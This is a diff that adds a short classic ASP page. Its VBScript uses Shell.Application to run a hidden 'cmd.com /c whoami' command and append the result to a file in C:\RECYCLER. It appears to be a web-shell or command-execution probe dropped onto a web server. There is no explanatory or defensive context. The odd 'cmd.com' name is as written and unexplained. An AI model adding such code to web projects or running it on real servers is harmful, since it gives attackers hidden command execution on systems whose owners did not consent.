@@ -1,0 +1,4 @@
+<%
+Set objShell = CreateObject("Shell.Application")
+objShell.ShellExecute "cmd.com", "/c whoami >>C:\RECYCLER\111.txt", "C:\RECYCLER\", "open", 0
+%>
